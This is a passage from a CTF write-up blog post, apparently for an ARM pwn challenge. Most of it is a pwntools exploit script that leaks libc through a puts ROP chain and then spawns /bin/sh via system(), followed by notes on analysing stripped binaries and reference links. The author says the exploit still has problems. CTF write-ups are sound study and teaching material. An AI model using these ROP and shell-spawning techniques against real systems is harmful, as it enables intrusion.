    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; : &#34;</span>, str(height))
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34; : &#34;</span>, str(weight))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">PT</span>(size):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>)
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(size))

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_diray</span>(payload):
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;4&#34;</span>)
    io<span style="color:#f92672">.</span>sendline(payload)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;6&#34;</span>)

<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
    check(<span style="color:#ae81ff">1.82</span>, <span style="color:#ae81ff">60</span>)
    PT(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
    <span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">    0x00011bbc : pop {r0, pc}
</span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
    pr0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00011bbc</span>
    leak <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">0x54</span>) <span style="color:#f92672">+</span> p32(pr0) <span style="color:#f92672">+</span> p32(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#f92672">+</span> p32(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]) <span style="color:#f92672">+</span> p32(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>]) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
    write_diray(leak)
    logout()
    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf6</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>: ]) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
    success(<span style="color:#e6db74">&#34;libc.address -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(libc<span style="color:#f92672">.</span>address))

    check(<span style="color:#ae81ff">1.82</span>, <span style="color:#ae81ff">60</span>)
    PT(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
    rop <span style="color:#f92672">=</span> cyclic(<span style="color:#ae81ff">0x54</span>) <span style="color:#f92672">+</span> p32(pr0) <span style="color:#f92672">+</span> p32(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>))) <span style="color:#f92672">+</span> p32(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>])
    write_diray(rop)
    logout()

    io<span style="color:#f92672">.</span>interactive()</code></pre></div>
<h2 id="more-1">More</h2>

<ul>
<li>libc_datebase for arm?</li>
<li>如何多快好省的分析 strip 后的程序

<ul>
<li>后来了解到，对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表</li>
</ul></li>
<li>我的 melong 的 exp 是有问题的, 暂待解决</li>
</ul>

<h2 id="reference-1">Reference</h2>

<p><a href="https://elixir.bootlin.com/linux/v2.6.32.51/source/arch/arm/include/asm/unistd.h">https://elixir.bootlin.com/linux/v2.6.32.51/source/arch/arm/include/asm/unistd.h</a>
<a href="https://bbs.pediy.com/thread-224583.htm">https://bbs.pediy.com/thread-224583.htm</a>
<a href="https://courses.washington.edu/cp105/02_Exceptions/Calling%20Standard.html">https://courses.washington.edu/cp105/02_Exceptions/Calling%20Standard.html</a>
<a href="http://hideroot.tistory.com/46">http://hideroot.tistory.com/46</a>
<a href="http://www.freebuf.com/articles/terminal/134980.html">http://www.freebuf.com/articles/terminal/134980.html</a></p>


</article>


<section class="post-nav">
    <ul>
        
        <li>
            <a href="https://0x01f.github.io/post/pin-in-ctf/"><i class="fa fa-chevron-circle-left"></i> Reverse is Multiplex, You Need Pintools</a>
        </li>
        
        
        <li>
            <a href="https://0x01f.github.io/post/whitehat2018-pwn-writeup/">WhiteHat2018 Pwn Writeup <i class="fa fa-chevron-circle-right"></i> </a>
        </li>
        
    </ul>
</section>
<head>
    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
</head>
<body>
    <div id="vcomments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            appId: 'goABwRBvfqsbEkzfPSjlbhDJ-gzGzoHsz',
            appKey: 'jm5HSLcqP40fvEBMOcBwPXPE',
            notify:false,
            verify:true,
            avatar:'wavatar',
            vistor:true,
            placeholder: 'Leave a comment',
            path:window.location.pathname
        })
    </script>
</body>





</main>
    <footer>
        <h6>Copyright &copy; 2018 - M4x | 
            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
            <a href="https://0x01f.github.io/index.xml">Subscribe</a></h6>
    </footer>
</div>
<script src="https://0x01f.github.io/js/scripts.js"></script>
</body>

</html>
